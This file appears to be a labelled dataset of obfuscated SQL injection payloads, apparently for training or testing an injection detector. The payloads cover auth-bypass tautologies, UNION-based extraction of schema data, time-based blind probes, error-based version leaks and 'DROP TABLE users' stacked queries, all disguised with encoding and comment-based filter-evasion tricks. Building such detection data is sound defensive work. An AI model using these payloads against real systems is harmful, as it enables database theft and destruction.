"TEst' Or '1'='1' --", 1
"1'/*!12345*/And SubSTrInG(dATAbAsE(), 1, 1) = 's' --", 1
"1' && (1<=%31)substring(data%62ase(%29, 1, 1%29 = '%73'  /*!*/AND 1=1--", 1
"'/**/OR/**/1	=  1/**/--/**/", 1
"1) UNION SELECT 1,database(),3--#49of8tdj", 1
"TeST' oR '1'='1' /*#4DKilNx9E", 1
"1%27ANDsubstring%28database%28%29%2C%0A1%2C%0A1%29%3D%27s%27--%250d%250a", 1
"te%73t%27|%7c'1'='1'/*%0d%0a*/%2d---qwl5xurr", 1
"1'%09%09%09%09OR%09%09%09%09IF(substring(database(),%09%09%09%091,%09%09%09%091)%20= 'a',%09%09%09%09SLEEP(5),%09%09%09%090)%09%09%09%09----z799n0pbgd0k1ds", 1
"1%u0027%u0020UNION%u0020SelECt%u0020tABle_NamE,%u0020null,%u0020NuLl%u0020fRoM%u0020INfORmAtIon_SchEMA.taBLES%u0020--", 1
"test%27%09%09OR%09%09%271%27%20%20%3D%09%271%27%09%09--%09%09", 1
"%74%65st'/*!*/OR '1%27='1' /*", 1
"%25u0027%25u0020OR%25u0020EXISTS%28SEL%2F%2A%2112345%2A%2FECT%25u00201%25u0020FROM%25u0020users%29----m2efqutxcbmd9", 1
"1%27%20OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20--#hrjrvpuxdw", 1
"admin' OR '1'='1--azo73", 1
"test'OR%0a'1'  =%20'1'", 1
"/*%0a # more_noise#vpib7yviq5r6w", 1
"' AND 1LIKE1 --", 1
"' OR 1>=1 -- --85zpjwe", 1
"test'or%0D%0a'1'%09=%20'1'/*%0A*//*/*%0A*/", 1
"%u0027%u0020aN%64%%750020ExTRaCTvaLue(1,ConCAT(0%785C,VER%73iO%6e())%29--", 1
";S%45LECT%2f*%0d%0a*%2fpg_sle%65p(5);", 1
"%2d- r%61ndom_noise--/*%0a*/", 1
"test'XOR'1'='1'/*%0d%0a*/--", 1
"1))%20U%6eIon%20s%65lect%20%31,%64ATABasE(),3----y3twnr1hf", 1
"%27%20XOR%20%271%27%3D%271", 1
"'      OR      1<%20=%091            #      more_noise--      #a3zrfi", 1
"1)%u0020uNioN%u0020seLecT%U00201,dATaBAse(),3--", 1
"'/**//**//**/A/*!*/ND/**//**//**/extractvalue(1,concat(0x5c,version()))--", 1
"1%27%20Or%20iF%28SUBsTRiNG%28DAtABAse%28%29%2C%201%2C%201%29%3d%27a%27%2c%20slEeP%285%29%2c%200%29%20--", 1
";/**/DRO%50/**%2fTABLE/**/users;/%2a*%2f--#d28r56f0l0u", 1
"%27 anD exTrACTVaLUe(1,ConCat(%30X5c,%76ErS%69oN%28)))--", 1
"tESt' oR '1'='1' /* /*!*/aND 1=1", 1
"1'%20OR if(SUbStriN%67(%64atabASE(), 1, 1%29='A', %73LEEP(5), 0)  %41nD 'A'='a'-%2d", 1
"%27%20aND%201%3DCONvERT(INT,@@versIon)--", 1
"' UNION SE%4cECT 1%2c2,3 -- rando%6d_noise%2d-#dsd5i6tif", 1
"%u0027%u0020ANd%u0020ExTRaCTVALue(1,ConcAT(0X5C,VErsIoN()))--", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20----8v4zgdc58", 1
"test%27%20OR%20%271%27%3D%271%27%20%2F%2A--9xk94", 1
"%27%20%20UNION%20%20SELECT%20%20null,%20%20null,%20%20null%20%20--%20%20", 1
"'/*!*/OR 1=1 --", 1
"%31) %55NION SE%4cECT 1,database(),3%2d- -- random_noise", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020 # more_noise----9l5e9asw", 1
"wAitfoR/**/%44%45LAy/**/'0:0:5'-%2D", 1
"'        uniON        SeLecT        1,2,3 /*!*/AND 1=1--", 1
"1)) %55NION S%45LECT 1,database%28),3 AND 'a%27='a%27--", 1
"1'/**/%41N%44/**/%73ubstring%28da%74abase(),/**/1,/**/1)/**/=/**/'s'/**//**/#/**/more_noise--", 1
"1'      OR      ascii(substring(database(),      1,      1))      >      100      --#j7m4h7ezkq0", 1
"' U%4e%49ON SELECT nu%6cl, n%75ll, null -- #c9v6l7770g", 1
"1'/**/oR/**/if(substRInG(databaSe(),/**/1,/**/1) = 'A',/**/SLEep(5),/**/0)/**//**//*!*/aNd/**/1 = 1--", 1
"' oR EXISTs(sELecT 1 fROm USErs)--", 1
"%u0027/*!12345*/AND%u0020%31=1%u0020%2d-%u0020#fve6d47ufp0n", 1
";%20DrOP%20TaBLE%20UsERs;%20 OR (1)--", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3----ct6v95patushn", 1
"1'        OR        IF(substring(database(),        1,        1)%20=%20'a',        SLEEP(5),        0)         OR 'b'='b'----wc1lkmhu46", 1
"' oR 1in (1)1 --", 1
"1))/**/UNION/**/SELECT/**/1,database(),3--#j7i4e", 1
"admin'O/*!12345*/R/*%0a*/'1'='1%0a", 1
"1%29%29%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2Cdatabase%28%29%2C3 # more_noise--#n59606utrakvw4", 1
"1%U0027%u0020and%u0020SUBstrINg(DAtabAsE(),%U00201,%U00201)%U0020%3D%u0020%u0027s%U0027%u0020%20OR%20%27b%27%3D%27b%27--", 1
"'%09%09%09%09%09O/**/R%09%09%09%09%09'1'	=	'1", 1
"%2531%20AND%201%3D1", 1
"WAITFOR%09%09%09DELAY%09%09%09'0:0:5'--", 1
";%20D%52OP%20TABLE%20users;%20%20OR%20(1)--", 1
"'/*!*/     OR%20%271'  =%09'1", 1
"1%u0027/**/orIf(subSTRiNg(DaTaBaSe(),1,1)=%u0027A%u0027,sLEep(5),0)%0a--", 1
"1) UNION SELECT 1,database(),3 OR 'b'='b'----v6p03xg6fbbj1b9", 1
"' UNION SELECT null, null, null  AND 'a'='a'-- --wbjf56wq", 1
"1'					UNION					SELECT					table_name,					null,					null					FROM					information_schema.tables					--#dzkhev17", 1
"1'UNION/*%0a*/SELECTtable_name,%0anull,nullFROM", 1
"information_schema.tables--random_noise--#j9123kriz6cyi8", 1
"'%20UNI%4fN%20SELECT 1,2,3--", 1
"%27%2520%2520%2520%2520UNION%2520%2520%2520%2520SELECT%2520%2520%2520%25201%2C2%2C3--", 1
"1AND%201<=1%0d%0a", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)>=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020----d0mu4n4on226w", 1
"WAITFOR			DELAY			'0:0:5'--", 1
"test' OR '1'>='1' /*#8m06e", 1
"%31	AND	1	= 1", 1
"%u0027%u0020&&%u0020(1%3D1)1%3Dconvert(in%74,@@ve%72s%69on)%2d-", 1
"1%27OR%0d%0aIF(substring(database(),%0d%0a1,1)%3D%27a%27,SLEEP(5),0)--%0a", 1
"'/**/UNION SELECT null, null, null --", 1
";   DROP   TABLE   users;   --", 1
"test%27%20OR%20%271%27LIKE%271%27%20--%20", 1
"1 && %31=1--82D807", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables  # more_noise--", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users)%20OR%20(1)----erld9s", 1
"1'/**/unIOn/**/SeLeCT/**/TABLe_NamE,/**/NULL,/**/nuLL/**/frOm/**/INfORmatIoN_SCHemA.taBlEs/**/--", 1
"test%27%20O/*!12345*/R%20%271%27%3D%271%27%20--%20", 1
"1  &&  %28%31%20=%201)1 =%201 OR (1)", 1
"WAITF%4fR D%45LAY '0:%30:5'--", 1
"'%20%20OR%20%201%09LIKE	1%20%20--%20%20", 1
"WA%49TFOR DELA%59 '0:0:5'-%2d", 1
"%27				or				eXIsTS(selEcT				1				from				usErS)--", 1
"'OR%0d%0a1=1--/*%0D%0A*/--tngiimtgc", 1
"1AND%0d%0a1%3D1/*%0d%0a*/", 1
"'AND%0d%0a1IN (1)convert(int,@@version)--", 1
"", 1
"'OR%0a1=1/*%0a*/--", 1
"1)UNiOn/*%0A*/SELeCT1,dataBAsE(),3--%0a", 1
"WAI%54F%4fR%20DELAY%20%270%3A0%3A5%27-%2d", 1
"TeST'		or		'1' =	'1'		 -- random_noise--", 1
"test'OR'1'='1'/*/*%0d%0a*/#%0d%0amore_noise/*%0a*/", 1
"test' OR '1%27%3d'1' /* OR (1)", 1
"WaItFor%u0020DeLAy%u0020%u00270:0:5%u0027--", 1
"'/*!*/UNION %53E%4cECT null, null, null%20 /*!*/AND 1=1--%20--k%63c72dyye41u3%30", 1
"ADmIN' oR '1'='1", 1
"admin%27%20OR%20%271%27%3D%271%09%09#%09%09more_noise", 1
"WaiTFoRdElAy/*%0d%0a*/'0:0:5'	Or	(1)--", 1
"", 1
";%20SEL%45C%54%20pg_sl%65ep(5);%20--", 1
"adM%69n%27%4fr", 1
"%%3271%27%3D%271", 1
"1%u0027%u0020A/*!*/ND%u0020substring(database(),%u00201,%u00201)%u0020LIKE%u0020%u0027s%u0027%u0020--", 1
"1' Or iF(SUBsTRiNg(dAtABaSE(), 1, 1)='a', SLeEP(5), 0) --", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users)%20#%20more_noise--", 1
"1%20&&%201%3D1", 1
"%27%20OR%20EXISTS(%53ELECT%201%20%46%52O%4d%20users)--", 1
"1/**/And%U00201=1", 1
"1'        UNION        SELECT        table_name,        null,        null        FROM        information_schema.tables                OR        'b'	=%09'b'--", 1
"1			AND			1%09=	1--66p01ei3aawvb03", 1
"'AND%0aextractvalue(1,concat(0x5c,version()))--/*%0a*/", 1
"%2527%2520O/*!*/R%25201%253D1%2520--%2520%23us4s1yn0fqj", 1
"%u0027%20%20OR%20%20%u00271%u0027	=%u0020%u0020%u00271", 1
"%27%2520%2520%2520%2520%2520AND%2520%2520%2520%2520%25201%2509%3D%2509convert%28int%2C%40%40version%29 OR 'b'='b'--", 1
"test'/**/OR/**/'1'<='1'/**/--/**/--ktz01t91xdeqm41", 1
"1/*!*/&&%201%3D1", 1
"%3%42%20DRo%50%20TabLe%20Us%65rs%3B%20--", 1
"test'					OR					'1'>  =%20'1'					--", 1
"' && %65xtra%63tvalue(1,co%6ecat(0x5c,versi%6fn(%29))--", 1
"'/**/UNION SE%4cECT 1%2c2,3 OR (1)%2d-", 1
"%27%20OR%201%3D1%%32%30 /*!*/AND%20%31=1--%20", 1
"'UNIONSELECTnull,null,null%0a--", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20 AND 'a'='a'--", 1
"1)  UNION  SELECT  1,database(),3--#gxw012yzz6", 1
"%u%30027%%75002%30OR%u00%3201=1%u0020/**/AND/**/'a'='a'--%u0020", 1
";sElECT/*%0a*/Pg_slEeP(5);--%0a", 1
"' && extractvalue(1,concat(0x5c,version()))--", 1
"1' AND substring(database(), 1, 1) >= 's' --", 1
"%27%20%20%20%20%20%55NiON%20%20%20%20%20seLeCT%20%20%20%20%201,2,3--", 1
"admin%27%20XOR%20%271%27%3D%271%20/*!*/AND%201%3D1", 1
";%20DROP%20TABLE%20%75sers;%20-%2d", 1
"'OR%0a'1'='1", 1
"", 1
"' UNI%4fN SELECT%201,2,3---%2dl%367q7b9ak0f", 1
"1%u0027%u0020%u0020||%u0020%u0020ascii(substring(database(),%u0020%u00201,%u0020%u00201))%u0020%u0020>%u0020%u0020100%u0020%u0020--", 1
"1' oR ASCii(SubStRiNG(daTabAse(), 1, 1)) > 100 --", 1
";/**//**/DROP/**//**/TABLE/**//**/users;/**//**/--", 1
"%u0027/*!*/OR%u0020EXISTS(SELECT%u00201%u0020FROM%u0020users)%u0020OR%u0020%u0027b%u0027=%u0027b%u0027--#zfeecv", 1
"1' UNion %53eLect%20tAble_nAMe, NULl, n%75L%6C F%52om iNFO%72matiOn_SchEMa.Ta%62LE%73 --", 1
"1'ANDsubstring(database(),1,1)%0aLIKE's'AND'a'='a'--#g8oeh5u8otce", 1
"%u0027%u0020OR%u0020EXISTS(SELECT%u00201%u0020FROM%u0020users)--#0quxeuw", 1
";/*!*/DRoP taBLe uSerS;  OR (1)--", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0)  -- random_noise--", 1
"'		OR		'1'	=  '1#pyouvo3w9jyun", 1
"'/**/OR/**/EXISTS(SELECT/**/1/**/FROM/**/users)/**/--/**/random_noise--", 1
"%27/*!*/AND %31LIKEconvert(int,@@ve%72%73ion)--", 1
"' AND 1<=1 -- --fynrd0", 1
"%27UnioNSelEctnuLL,nULl,%0D%0aNULL", 1
"--", 1
";/*!*/DROPTABLEusers;/*%0d%0a*/--", 1
"'/*!12345*/OR EXISTS(SELECT 1 FROM users) AND 'a'='a'----fo2cy2srv6", 1
"adMIn'    oR    '1'  =%09'1    anD    'a'  =%09'a'", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0)  # more_noise--", 1
"%27%20AND%201LIKEconvert%28int%2C%40%40version%29--", 1
"test' OR '1'='1' -- --n54qc8ia9vtis", 1
"1))%u0020UNION%u0020SELECT%u00201,database(),3--#8klfnmxmpupr", 1
"'/**/OR/**/'1'='1/*!*//*!*/AND 1=1", 1
"WAItFor%20DelaY%20%270%3A0%3A5%27--", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020/**/OR/**/(1)--%u0020--kab2z", 1
"%u0027OR1=1 OR (1)--", 1
"/*%0a*/", 1
"; DROP TABLE users;  OR 'b'='b'--", 1
"1)/**/UN/**/ION/**/SELECT/**/1,database(),3--", 1
"1))%20UNION%20SELECT%201,database(),3--#o8g6k2cz8qopzw3", 1
"%27%2F%2A%21%2A%2FAND1%3D1--%250d%250a%2F%2A%250a%2A%2F", 1
"; sElEct PG_sleEP(5);  /*!*/AnD 1=1--", 1
"'/**/A/*!12345*/ND/**/1LIKE1/**/--/**/", 1
"%27%20Or/**/1=1/**/--/**/--j51bx1", 1
"1%u0027%4fR%49F(substring(database(),/*%0a*/1,1)IN%u0020(1)%u0027%61%u0027,SL%45EP(5),0%29/*%0a*/%2d-/*%0d%0a*/", 1
"%27/**/aND%201%3DCOnvert(InT,@@VersIoN)--", 1
"admin'/**/OR/**/'1'='1/**//*!*/AND/**/1=1--44b3aval", 1
"%27%20A/**/ND%20extractvalue(1,concat(0x5c,version()))--", 1
"' OR '1'%4cIKE%271", 1
"1%27%2F%2A%2A%2FOR%2F%2A%2A%2Fascii%28substring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%29%2F%2A%2A%2F%3E%2F%2A%2A%2F100%2F%2A%2A%2F--", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20--#ex2tdm8zso2rbci", 1
"WAITFOR%20DELAY%20%270:0:5%27 AND 'a'='a'--", 1
"%27%20AND%201%3Dconver%74%28int%%32C%40%40v%65%72sion%29%20A%4e%44%20%27a%%327%3D%27a%27--", 1
"1' OR IF(substring(database(), 1, 1)IN (1)'a', SLEEP(5), 0) --", 1
"%u0027/**/OR%u00201>=1%u0020 # more_noise--%u0020", 1
"'/**//**//**//**//**/union/**//**//**//**//**/selecT/**//**//**//**//**/1,2,3--", 1
"1) unIoN seleCT 1,dAtabasE(),3--", 1
"' AND extractvalue(1,concat(0x5c,version()))--#ko8wgp4wzkg", 1
"WAITFOR%20DELAY%20%270:0:5%27----ov9o4t6xibc", 1
"1' OR ascii(substring(database(), 1, 1)) > 100  OR (1)--", 1
"test%%327/**/OR/**/%271%27%20%%33D%%320%20%27%31%27%2f**//*", 1
"adMiN%27/**/oR/**/%271%27%3d%271", 1
"waiTFoR%20DeLaY%20%270%3a0%3A5%27--", 1
"1%27%20%20%20%20%20%20AND%20%20%20%20%20%20substring%28database%28%29%2C%20%20%20%20%20%201%2C%20%20%20%20%20%201%29%20%20%20%20%20%20%2509%3D%2520%20%20%20%20%20%20%27s%27%20%20%20%20%20%20--", 1
"'AND%0aextra%63tvalue(1%2cconcat(%30x5c,ver%73io%6e()))--%0d%0a", 1
"%%327%2%30AND%201%3D1%2%30 OR %27b'LIKE'b'--%20", 1
"%27%2F%2A%2112345%2A%2FUNION%20SELECT%201%2C2%2C3 /*!*/AND 1=1--", 1
"1%u0027%u0020%u0020%u0020%u0020unioN%u0020%u0020%u0020%u0020selECT%u0020%u0020%u0020%u0020tABLE_nAMe,%u0020%u0020%u0020%u0020NULL,%u0020%u0020%u0020%u0020NUlL%u0020%u0020%u0020%u0020FroM%u0020%u0020%u0020%u0020InformATIOn_schEmA.TablES%u0020%u0020%u0020%u0020--", 1
"WAITFOR%20DELAY%20%270:0:5%27 AND 'a'='a'--#g58f1w3ens3ho", 1
"1%27%2F%2A%2A%2FOR%2F%2A%2A%2Fascii%28substring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%29%2F%2A%2A%2F%3E%2F%2A%2A%2F100%2F%2A%2A%2F----8i7i8c6w", 1
"'/**%2f%41ND/**/extra%63tva%6cue(1,concat(%30x5c,version()))-%2d", 1
"%2527%20AND%20extractvalue%28%2531%252cc%256fncat%280x5c%252cversion%28%29%29%29 # more_noise--", 1
"1/*!12345*/AND 1=1 OR 'b'='b'", 1
"'%20%20uNIOn%20%20sEleCt%20%201,2,3--", 1
";/*!12345%2a/%44roP tABle us%65rS;%20--", 1
"1%27%20OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20--#1k026dilzxq21x1", 1
"%2527%2520Or%%32%35201%%3253D1%2520--%%32520", 1
"1'					UN%49ON	%09			SELECT					table_name,					null%2c					null					FROM					inf%6frm%61ti%6fn_sche%6d%61.%74ables%09			%09--", 1
"%27%20anD%201%3D1%20%20%23%20mORE_nOISe--%20%23oHm4Tzci", 1
"1%25u%2530027%25u0020OR%25u0020ascii%28sub%2573trin%2567%28%2564a%2574abase%28%29%2C%25u00%253201%2C%25u00201%29%29%25u0%253020%3E%25u0020100%25u0%253020-%252d", 1
"1'/**/UNION SELECT table_name, null, null FROM information_schema.tables  -- random_noise--", 1
"test%27 OR '1%27='1' /*", 1
"WAITFORDELAY%0d%0a'0:0:5'--/*%0a*/--50i7jed", 1
"%u0027/**/AND/**%2f1=cO%6eVErT(int,@@V%65%72sio%6E)--", 1
"1))%20UNIONSEL%45CT", 1
"1,database(%29,3%2d-/*%0a*/ # more_noise#duimh", 1
"1' UnIOn sELeCT TaBle_NAME, NuLl, NUlL frOm INfoRmATIoN_scHemA.tableS  XOr 'B'='b'--", 1
"' OR 1=1 -- #ybb63auhcm5", 1
"%27/**//**//**//**/UNION/**//**//**//**/SELECT/**//**//**//**/null,/**//**//**//**/null,/**//**//**//**/null/**//**//**//**/--/**//**//**//**/", 1
"%27%20OR%20%271%27%3D%271#2c58i66k7a", 1
"1)%u0020%u0020UNION%u0020%u0020SELECT%u0020%u00201,database(),3----dgs98ansjev2h", 1
"1%20ANd%201%3D1", 1
"1))UNION/*%0d%0a*/SELECT", 1
"1,database(),3--/*%0d%0a*/", 1
"1AND1%3d1/*!*/AND", 1
"1=1--6oksvuzdi", 1
"%u0027%u0020OR%u00201>=1%u0020%u0020OR%u0020%u0027b%u0027=%u0027b%u0027--%u0020", 1
"'OR/*%0a*/", 1
"EXISTS(SELECT1FROMusers)--", 1
"WAITFORDELAY/*%0a*/'0:0:5'--%0a", 1
"1%u0027/**/O/*!*/R/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/--", 1
"'%20%20OR%20%20EX%49STS%28SELECT%20%20%31%20%20FROM%20%20us%65rs)--", 1
"' o%52 ExiS%54s(sElECt 1 fROm%20usE%72S)--", 1
"1%29%29%2520UNI%254fN%2520SEL%2545CT%2520%2531%2Cdatab%2561se%28%29%2C3--", 1
"%27%20XOR%201%3D1%20--%20#89no3149zb44d", 1
";%20DROP%20TABLE%2%30%75sers;%20%20/*!%2a/%41ND%201%3D1-%2d", 1
"1' && substring(database(), 1, 1) = 's'  AND 'a'='a'--", 1
"%U0027%u0020UniON%U0020SElEcT%U00201,2,3----lqI1xQ", 1
"1%29%29%2520uNion%2520SELect%25201%2CDaTABasE%28%29%2C3--", 1
"1' OR IF(substring(database(), 1, 1)LIKE'a', SLEEP(5), 0)  OR (1)--", 1
"1))UNIONSELECT", 1
"1,database(),3----9dme8fdba", 1
"t%65st' XOR '1%27LIKE'1' -- -%2d8wnzuaq6%30qyu1", 1
";/*!12345*/SELECT pg_sleep(5); --", 1
"1)%09UNION%09SELECT%091,database(),3--", 1
"1%27%20unION%20sElect%20TabLe_NAME%2C%20NUll%2C%20NuLL%20FrOM%20inFORMATIoN_sChEMa.TAblES%20--", 1
"ADMIN%u0027/**/Or%u0020%u00271%u0027=%u00271", 1
";DROP%0aTABLEusers;--/*%0d%0a*/", 1
"' AN%44 extr%61ctv%61lu%65(1,concat(0x5c,version(%29))--", 1
"1%27%09AND%09substring(database(),%091,%091)%09%09%3D%20%20%09%27s%27%09--#w8kernsw1lkbpk", 1
"; SeLeCt Pg_slEEp(5); --", 1
"1'/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/----7gpsqa", 1
"1' && (1IN (1)1)substring(database(), 1, 1) = 's' --", 1
"%u00%327%u0%3020AND%u%300%3201  =	1%u0020--%u0020", 1
"'UNION%0d%0aS%45LE%43T", 1
"1,2%2c3 AND%20'a'='a'--/*%0%61*/", 1
"1'uNionSELECTtAble_NAMe,nULl,", 1
"nullFrom/*%0d%0a*/inFOrmAtiOn_sChEma.taBLES", 1
"--", 1
"1'%20%20%20%20%20AND%20%20%20%20%20substring(database(),%20%20%20%20%201,%20%20%20%20%201)%20%20%20%20%20  = %20%20%20%20%20's'%20%20%20%20%20--", 1
"1AND%0a1=1%0a", 1
"%31%u0027%u0020UNION%u002%30SELECT%u0020t%61%62%6ce_name,%%750020null,%u0%3020n%75ll%u0020FROM%u0020in%66ormation_s%63hema.tables%u002%30%u00%32%30/*!*/A%4eD%u00201%3D1--", 1
"'/**//**/AND/**//**/extractvalue(1,concat(0x5c,version()))--#hwypdc7ik9m", 1
"1'O/*!*/RIF(substring(database(),1,%0a1)='a',SLEEP(5),", 1
"0)--/*%0a*/", 1
"%31%2F%2A%2112345%2A%2FA%4eD%201%3%441", 1
"1%27%20OR%20IF%28SUbstRING%28daTaBaSE%28%29%2C%201%2C%201%29%3C%3D%27a%27%2C%20sleep%285%29%2C%200%29%20--", 1
";%20DRO%50 TABL%45 us%65rs; ----g1h0pg", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--#peqllapr5fpb43w", 1
";SELECT%0apg_sleep(5);/*%0a*/--/*%0a*/", 1
"'O%52%45XISTS(SELECT%0d%0a1FR%4fMus%65rs)----2lucp1tgvlw", 1
"'%20or EXiSt%53(sElecT%201 FrOM uS%65rS%29 -- RaND%6FM_NoISE--", 1
"1%20AND%201IN%20%281%291", 1
"%u0027%u0020OR%u00201%3D1%u0020--%u0020", 1
"adm%69n%27%20O/*!12345*/R%20%27%31%27%3D%271 OR 'b'='b'", 1
"1%27%20UNION%20SE%254cECT%20table_name%2C%20null%2C%20nul%256c%20F%2552OM%20inf%256frmation%255f%2573c%2568ema.t%2561bles%20%20--%20random_noise--", 1
"%27OR%250a%271%27%3D%271%250a", 1
"1'/*!*/XOR substring(database(), 1, 1) = 's' --", 1
"' AND extractvalue(1,concat(0x5c,version())) -- random_noise--", 1
"%27%20OR%20%271%27%3D%271/*!*/AND%0a1=1/*%0d%0a*/--fs0rf28z", 1
"%u0027%u0020OR%u0020EXISTS(SELECT%u00201%u0020FROM%u0020users)%u0020--%u0020random_noise--", 1
"'/*!12345*/AND/**/1=convert(int,@@version)----fd1hqmxq5", 1
"test' XOR '1'='1' /*--znjqbh8b475tu9", 1
"%27%20O/*!*/R%20%271%27%3D%271%20%2F%2A%21%2A%2FAND%201%3D1#afszs45xy", 1
"1%20AND%201%3D1%20#%20more_noise", 1
"%27", 1
"AND", 1
"extractvalue(1,concat(0x5c,version()))--", 1
"waiTfOr  dELAy  '0:0:5'--", 1
"1/*!*/AND%201%3E%3D1", 1
"1)/**/UNION/**/SELECT/**/1,database(),3--#dkf5a", 1
"%27%20AND%20extractvalue(1,concat(0x5c,version()))----7ije6g3", 1
"'/**//**/AND/**//**/1<%09=	convert(int,@@version)--", 1
"WAITFORDELAY", 1
"'0:0:5'--/*%0d%0a*/", 1
"'OR1=1/*%0a*/--", 1
"%27%20Union%20SElecT%201,2,3 OR (1)--", 1
"' aND 1=1 --", 1
"%2527%2520OR%2520EXISTS%28SELECT%25201%2520FROM%2520users%29%2520--%2520random_noise--", 1
"test' OR '%31'IN (1)'1'%20/*", 1
"%61dmin%u0027%u0020%4fR%u0020%271%u0027IN (1)%u00271#46c%7akcl2g9n4b", 1
"1)%%750020UNION%u0%3020S%45LECT%u00201,database()%2c%33--", 1
"1))%20UNION SE%4cE%43T 1,%64atabase(),3--", 1
"1          AND          1 = 1          #          more_noise", 1
"1 and 1=1", 1
"1)%20%20%20UNION%20%20%20SELECT%20%20%201,database(),3--", 1
"'/**/AND/**/1=convert(int,@@version)----vujyqlh4", 1
"' AND extractvalue(1,concat(0x5c,version()))--#o3yarh3kx4qt", 1
"1'ORIF(substring(database(),1,1)='a',SLEEP(5),%0a0)--", 1
"TEsT%u0027%U0020or%U0020%u00271%U0027=%U00271%u0027%U0020--%u0020", 1
"1/**/AND/**/1%3D1", 1
"%27%u0020OR%u00201=1%u0020--%20", 1
"%u0027/*!12345*/OR%u00201<=1%u0020--%u0020", 1
"%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2F%2A%2A%2F--%2F%2A%2A%2F", 1
"%U0027/*!12345*/AND%u00201=CoNVERt(int,@@vERsION)--", 1
"%27%2F%2A%2A%2FaNd%201%3D1%20--%20%23dXVO70uCAf", 1
"' OR EXISTS(SELECT 1 FROM users) # more_noise--#qbraw7nif7", 1
"'/**/AnD/**/1 =  cOnVeRT(iNt,@@vERsIOn)--", 1
"1/**/AND/**/1%09=%091", 1
"%27 OR 1%3d1 -- --0if5dpfyxb", 1
"1) UnioN SelecT 1,DataBAse(),3----sdtYC7G", 1
"'or", 1
"'1'='1", 1
"1%u0027/**/AND/**/substring(database(),/**/1,/**/1)/**/ =%09/**/%u0027s%u0027/**/--", 1
"'Un%49oN/*%0d%0a*/sE%4cECTNUlL,nULl,Nul%6c-%2D--lohn0b7w", 1
"test%25u0027%2F%2A%2112345%2A%2FOR%25u0020%25u00271%25u0027%3D%25u00271%25u0027%25u0020 /*!*/AND 1=1--%25u0020", 1
"test%27%20OR%20%271%27%3D%271%27%20--%20#huw75", 1
"%3B%2509%2509%2509%2509dROp%2509%2509%2509%2509TablE%2509%2509%2509%2509USeRS%3B%2509%2509%2509%2509--", 1
"WAITFOR%u0020DELAY%u0020%u00270:0:5%u0027 /*!*/AND 1=1--#lqkib", 1
"1%29%20UN/*!12345*/ION%20SELECT%201%2Cdatabase%28%29%2C3--#wh8scqwbfq", 1
"%u0027%09%09%09%09O%52%09%09%09%09EX%49STS(SE%4cECT%09%09%09%091%09%09%09%09FROM%09%09%09%09us%65rs)--", 1
"'UNIONSELECTnull,null,null--/*%0a*/", 1
"%25u0027%2F%2A%2A%2FAND%25u0020extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
"waItFoR/*!*/DELAY%u0020%u00270:0:5%u0027--", 1
"'/**/A/*!12345*/ND/**/1<=1/**/--/**/", 1
